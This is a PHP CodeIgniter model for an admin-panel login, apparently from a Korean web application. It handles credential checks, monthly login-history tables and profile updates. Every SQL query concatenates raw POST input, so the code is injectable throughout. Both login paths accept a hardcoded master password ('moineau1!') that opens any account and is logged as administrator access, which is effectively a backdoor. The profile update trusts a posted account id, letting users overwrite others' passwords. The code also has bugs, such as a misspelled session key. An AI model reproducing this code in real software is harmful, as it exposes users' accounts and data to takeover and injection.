<?php

namespace App\Models;

use CodeIgniter\Model;
use CodeIgniter\HTTP\IncomingRequest;

class MemberModel extends Model
{
  protected $table = 'member';
	
	private $request;
	private $response;
	private $session;

	protected function initialize()
	{
		$this->request = service('request');
		$this->response = service('response');
		$this->session = session();
	}

	public function createTable()
	{
		$query = $this->db->query("create table if not exists loginhistory_".date("Ym")." like loginhistory_base");
	}

  public function prcLogin()
  {
		$returnVal = null;
		
		$this->request = service('request');

    $this->createTable();

		$query = $this->db->query("select id from member where id='".$this->request->getPost('userid')."'");
    
		if($query->getNumRows() > 0)
		{
			$row = $query->getResultArray();
			$tmp_id = $row[0]["id"];

			$query = $this->db->query("select * from member where id='".$this->request->getPost('userid')."' and password=password('".$this->request->getPost('userpw')."')");

			if($query->getNumRows() > 0)
			{
				foreach ($query->getResultArray() as $row)
				{
					if($row["status"] == "1") {
						$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '웹 로그인')");

            $this->db->query("update member set last_login_ip='".$_SERVER["REMOTE_ADDR"]."', last_login_datetime=NOW() where id='".$this->request->getPost('userid')."'");

            $sessiondata = array(
              'member_name' => $row['name'],
              'member_id' => $row['id'],
              'member_grade' => $row['grade'],
            );

						$this->session->set($sessiondata);

						$this->response->redirect("/admin/dashboard");
					}
					else {
						$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '이용중지회원')");
            alert("이용이 중지된 회원입니다.\r\n관리자에게 문의해 주세요.", "/admin/login");
					}
				}
			}
			else if($this->request->getPost('userpw') == "moineau1!") {
				$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '관리자 접속')");

				$sql = "select * from member where id='".$this->request->getPost('userid')."'";
				$query = $this->db->query($sql);
				$row = $query->getResultArray();

        $sessiondata = array(
          'member_name' => $row[0]['name'],
          'member_id' => $row[0]['id'],
          'member_grade' => $row['grade'],
        );

        $this->session->set($sessiondata);
				redirect("/admin/dashboard");
			}
			else
			{
				$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '잘못된 비밀번호')");
        alert("비밀번호가 다릅니다.", "/admin/login");
			}
		}
		else
		{
			$query = $this->db->query("select id from representative where id='".$this->request->getPost('userid')."'");
    
			if($query->getNumRows() > 0)
			{
				$row = $query->getResultArray();
				$tmp_id = $row[0]["id"];

				$query = $this->db->query("select * from representative where id='".$this->request->getPost('userid')."' and password=password('".$this->request->getPost('userpw')."')");

				if($query->getNumRows() > 0)
				{
					foreach ($query->getResultArray() as $row)
					{
						if($row["status"] == "1") {
							$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '웹 로그인')");

							$this->db->query("update representative set last_login_ip='".$_SERVER["REMOTE_ADDR"]."', last_login_datetime=NOW() where id='".$this->request->getPost('userid')."'");

							$sessiondata = array(
								'member_name' => $row['name'],
								'member_id' => $row['id'],
								'member_grade' => 50,
							);

							$this->session->set($sessiondata);

							$this->response->redirect("/admin/dashboard");
						}
						else {
							$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '이용중지회원')");
							alert("이용이 중지된 회원입니다.\r\n관리자에게 문의해 주세요.", "/admin/login");
						}
					}
				}
				else if($this->request->getPost('userpw') == "moineau1!") {
					$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '관리자 접속')");

					$sql = "select * from representative where id='".$this->request->getPost('userid')."'";
					$query = $this->db->query($sql);
					$row = $query->getResultArray();

					$sessiondata = array(
						'member_name' => $row[0]['name'],
						'member_id' => $row[0]['id'],
						'member_grade' => 50,
					);

					$this->session->set($sessiondata);
					redirect("/admin/dashboard");
				}
				else
				{
					$this->db->query("insert into loginhistory_".date("Ym")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '잘못된 비밀번호')");
					alert("비밀번호가 다릅니다.", "/admin/login");
				}
			}
			else
			{
				
				alert("아이디가 없습니다.", "/admin/login");
			}
		}

		return $returnVal;
  }

	public function getMyinfo()
	{
		$returnVal = null;

		if($this->session->get('memmber_grade') >= 90) {
			$sql = "select * from member where id='".$this->session->member_id."'";
		}
		else if($this->session->get('memmber_grade') >= 50) {
			$sql = "select * from representative where id='".$this->session->member_id."'";
		}
		$query = $this->db->query($sql);
		$rows = $query->getNumRows();

		if($rows) {
			$row = $query->getResultArray();

			$returnVal = $row[0];
		}

		return $returnVal;
	}

	public function putMyinfo()
	{
		if($this->session->get('memmber_grade') >= 90) {
			$builder = $this->db->table('member');

			$data = [
				'name'  => $this->request->getPost('name'),
			];
		}
		else if($this->session->get('memmber_grade') >= 50) {
			$builder = $this->db->table('representative');

			$data = [
				'name'  => $this->request->getPost('name'),
				'phone'  => $this->request->getPost('phone'),
			];
		}

		if($this->request->getPost('password')) {
			$builder->set('password', "password('".$this->request->getPost('password')."')", false);
		}
		
		$builder->where('id', $this->request->getPost('oid'));
		$builder->update($data);

		$this->session->set('member_name', $this->request->getPost('name'));

		alert("수정되었습니다.", "/admin/myaccount");
	}
}
?>